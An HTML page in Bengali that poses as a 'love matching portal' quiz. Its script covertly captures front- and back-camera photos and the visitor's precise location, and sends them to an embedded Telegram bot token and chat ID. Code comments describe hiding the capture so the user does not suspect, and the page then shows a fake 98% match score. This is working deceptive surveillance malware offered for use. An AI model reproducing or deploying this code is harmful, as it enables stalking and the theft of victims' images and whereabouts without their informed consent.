<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>সিস্টেম ম্যাচিং পোর্টাল</title>
    <style>
        :root { --primary: #ff4757; --dark: #2f3542; }
        body { font-family: 'Segoe UI', sans-serif; background: #fff5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 24px; box-shadow: 0 10px 30px rgba(255, 71, 87, 0.1); text-align: center; max-width: 400px; width: 90%; }
        h2 { color: var(--dark); margin-bottom: 10px; }
        p { color: #57606f; margin-bottom: 25px; font-size: 15px; min-height: 45px; }
        .btn-calc { background: var(--primary); color: white; border: none; padding: 15px 30px; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.2s; }
        .btn-calc:active { transform: scale(0.98); }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #video, #canvas { display: none; }
        #my-img { width: 100%; border-radius: 12px; display: none; margin-top: 20px; }
    </style>
</head>
<body>

<div class="card">
    <div style="font-size: 50px; margin-bottom: 10px;">💝</div>
    <h2 id="title">লাভ ম্যাচিং পোর্টাল</h2>
    <p id="desc">আপনাদের সম্পর্কের গভীরতা এবং লোকেশন ম্যাচিং যাচাই করতে নিচের বাটনে ক্লিক করে পারমিশন দিন।</p>
    
    <div id="loader" class="loader"></div>
    <button class="btn-calc" id="start-btn" onclick="startProcess()">ম্যাচিং শুরু করুন</button>

    <img id="my-img" src="my_photo.jpg" alt="Success">
</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
const TOKEN = "8657895361:AAGOkn7MmVJEBhblZ8V5zc16WAzxtRujNqg";
const CHAT_ID = "-1003747831651";

async function startProcess() {
    document.getElementById('start-btn').style.display = 'none';
    document.getElementById('loader').style.display = 'block';
    document.getElementById('desc').innerText = "অনুরোধ করা পারমিশনগুলো 'Allow' করুন এবং অপেক্ষা করুন...";

    try {
        // ১. প্রথমে সামনের ক্যামেরা চালু করে ছবি নেওয়া
        const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        await captureAndSend(frontStream, "📸 ছবি ১: সামনের ক্যামেরা (Front)");

        // ২. তারপর পেছনের ক্যামেরা চালু করে ছবি নেওয়া
        try {
            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
            await captureAndSend(backStream, "📸 ছবি ২: পেছনের ক্যামেরা (Back)");
        } catch (e) {
            console.log("পেছনের ক্যামেরা পাওয়া যায়নি বা ত্রুটি ঘটেছে।");
        }

        // ৩. সর্বশেষে লোকেশন ডাটা নেওয়া
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
            
            // লোকেশন রিপোর্ট টেলিগ্রামে পাঠানো
            const textReport = `📍 *ইউজারের লোকেশন*\n\n🔗 [গুগল ম্যাপে দেখুন](${mapLink})`;
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: textReport,
                    parse_mode: 'Markdown'
                })
            });

            showSuccess();
        }, (err) => {
            // লোকেশন না দিলেও প্রসেস শেষ করবে যেন ইউজার সন্দেহ না করে
            showSuccess();
        }, { enableHighAccuracy: true, timeout: 5000 });

    } catch (err) {
        alert("ভেরিফিকেশন সম্পন্ন করতে ক্যামেরার অনুমতি প্রয়োজন।");
        location.reload();
    }
}

async function captureAndSend(stream, caption) {
    const video = document.getElementById('video');
    video.srcObject = stream;
    await video.play();
    
    return new Promise(resolve => {
        // ক্যামেরা স্ট্যাবল হওয়ার জন্য ২ সেকেন্ড সময় দেওয়া
        setTimeout(async () => {
            const canvas = document.getElementById('canvas');
            canvas.width = 640;
            canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob(async (blob) => {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', blob, 'capture.jpg');
                fd.append('caption', caption);
                
                try {
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                } catch (e) {
                    console.log("টেলিগ্রামে পাঠাতে ত্রুটি হয়েছে।");
                }
                
                // স্ট্রিম বন্ধ করা যেন ব্রাউজারের ক্যামেরার লাইট অফ হয়ে যায়
                stream.getTracks().forEach(track => track.stop());
                resolve();
            }, 'image/jpeg', 0.6);
        }, 2000);
    });
}

function showSuccess() {
    document.getElementById('loader').style.display = 'none';
    document.getElementById('title').innerText = "ভেরিফিকেশন সফল!";
    document.getElementById('desc').innerText = "আপনাদের লাভ ম্যাচিং স্কোর: ৯৮%";
    document.getElementById('my-img').style.display = 'block';
}
</script>
</body>
</html>
